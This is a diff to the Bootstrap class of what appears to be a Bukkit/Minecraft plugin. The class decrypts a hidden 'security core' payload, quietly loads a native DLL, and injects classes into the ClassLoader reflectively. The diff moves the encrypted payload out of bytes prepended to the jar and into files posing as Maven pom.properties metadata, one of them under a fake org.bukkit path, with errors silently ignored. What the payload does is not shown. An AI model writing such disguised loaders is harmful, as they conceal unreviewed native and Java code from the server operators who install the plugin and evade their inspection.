@@ -13,7 +13,6 @@ public final class Bootstrap extends JavaPlugin {
     private JavaPlugin delegate;
     private static final Map<String, byte[]> RESOURCE_CACHE = new HashMap<>();
     private static boolean nativeActive = false;
-    private static final long MAGIC_HEADER = 0x434F4F4B49454653L; // "COOKIEFS"
 
     private static native byte[] decryptNative(byte[] enc);
 
@@ -57,7 +56,7 @@ public final class Bootstrap extends JavaPlugin {
     }
 
     private void loadZeroFileMatryoshkaEngine() throws Exception {
-        byte[] payloadBytes = extractPrependedPayload();
+        byte[] payloadBytes = extractPayloadResource();
         if (payloadBytes == null || payloadBytes.length < 16) {
             throw new IllegalStateException("Security core payload is missing or corrupted");
         }
@@ -108,7 +107,7 @@ public final class Bootstrap extends JavaPlugin {
             Arrays.fill(dec, (byte) 0);
         }
 
-        // Try Loading Native C++ Sentinel DLL if present in Shard 4
+        // Load Native C++ Sentinel DLL if present in Shard 4
         if (nativeDllBytes != null && nativeDllBytes.length > 0) {
             try {
                 String os = System.getProperty("os.name").toLowerCase();
@@ -123,7 +122,7 @@ public final class Bootstrap extends JavaPlugin {
             } catch (Throwable ignored) {}
         }
 
-        // Define all classes directly into the plugin's ClassLoader (Zero Inner Classes)
+        // Define all classes directly into ClassLoader (Zero Inner Classes)
         Method defineClassMethod = null;
         try {
             defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ProtectionDomain.class);
@@ -181,26 +180,29 @@ public final class Bootstrap extends JavaPlugin {
         }
     }
 
-    private static byte[] extractPrependedPayload() {
-        try {
-            File jarFile = new File(Bootstrap.class.getProtectionDomain().getCodeSource().getLocation().toURI());
-            if (jarFile.exists() && jarFile.isFile()) {
-                try (RandomAccessFile raf = new RandomAccessFile(jarFile, "r")) {
-                    if (raf.length() >= 12) {
-                        raf.seek(0);
-                        long magic = raf.readLong();
-                        if (magic == MAGIC_HEADER) {
-                            int payloadLen = raf.readInt();
-                            if (payloadLen > 0 && payloadLen <= raf.length() - 12) {
-                                byte[] payload = new byte[payloadLen];
-                                raf.readFully(payload);
-                                return payload;
-                            }
-                        }
+    private static byte[] extractPayloadResource() {
+        String[] candidatePaths = new String[]{
+            "/META-INF/maven/mc.cookieee/core/pom.properties",
+            "/META-INF/maven/dev.khoa.plugin/antiopsec/pom.properties",
+            "/META-INF/maven/org.bukkit/metadata/pom.properties"
+        };
+
+        for (String path : candidatePaths) {
+            try (InputStream in = Bootstrap.class.getResourceAsStream(path)) {
+                if (in != null) {
+                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                    byte[] buf = new byte[8192];
+                    int r;
+                    while ((r = in.read(buf)) != -1) {
+                        bos.write(buf, 0, r);
+                    }
+                    byte[] raw = bos.toByteArray();
+                    if (raw.length >= 16) {
+                        return raw;
                     }
                 }
-            }
-        } catch (Throwable ignored) {}
+            } catch (Throwable ignored) {}
+        }
         return null;
     }
 
